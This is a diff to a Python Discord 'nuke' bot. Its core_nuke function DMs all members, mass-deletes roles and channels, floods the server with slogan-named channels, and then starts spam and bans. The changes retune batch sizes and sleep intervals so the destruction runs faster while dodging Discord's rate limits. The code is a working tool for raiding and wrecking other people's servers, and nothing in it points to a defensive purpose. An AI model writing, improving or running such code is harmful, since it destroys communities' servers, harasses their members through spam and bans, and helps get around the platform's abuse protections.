@@ -100,8 +100,13 @@ async def core_nuke(guild, new_server_name=None):
     # DM
     await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
 
-    # ロール削除（並行）
-    await asyncio.gather(*(r.delete() for r in guild.roles if not r.is_default() and not r.managed), return_exceptions=True)
+    # ロール削除（並行バッチ + 再試行で速く）
+    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
+    batch_size = 30
+    for i in range(0, len(roles_to_delete), batch_size):
+        batch = roles_to_delete[i:i+batch_size]
+        await asyncio.gather(*(r.delete() for r in batch), return_exceptions=True)
+        await asyncio.sleep(0.05)
 
     # チャンネル削除（並行）
     await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)
@@ -114,17 +119,17 @@ async def core_nuke(guild, new_server_name=None):
     if member_count < 100:
         target_channels = 60  # 作りすぎ防止
         target_roles = 50
-        spam_sleep_min = 0.1
-        spam_sleep_max = 0.25
+        spam_sleep_min = 0.15
+        spam_sleep_max = 0.35
     elif member_count < 500:
         target_channels = 50
         target_roles = 40
-        spam_sleep_min = 0.15
-        spam_sleep_max = 0.35
+        spam_sleep_min = 0.2
+        spam_sleep_max = 0.4
     else:
         target_channels = 30
         target_roles = 30
-        spam_sleep_min = 0.25
+        spam_sleep_min = 0.3
         spam_sleep_max = 0.5
 
     # チャンネル作成（並行バッチ + 再試行）
@@ -133,7 +138,7 @@ async def core_nuke(guild, new_server_name=None):
     channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
     while len(channels) < target_channels:
         tasks = []
-        batch_size = 40
+        batch_size = 30  # 同時減らしてrate limit回避
         for _ in range(batch_size):
             if len(channels) >= target_channels:
                 break
@@ -143,7 +148,7 @@ async def core_nuke(guild, new_server_name=None):
         batch = await asyncio.gather(*tasks, return_exceptions=True)
         added = [c for c in batch if c]
         channels += added
-        await asyncio.sleep(0.08)  # 短め
+        await asyncio.sleep(0.1)  # 少し長めに
 
     # スパム開始 + BAN/ロール作成並行
     spam_messages = [
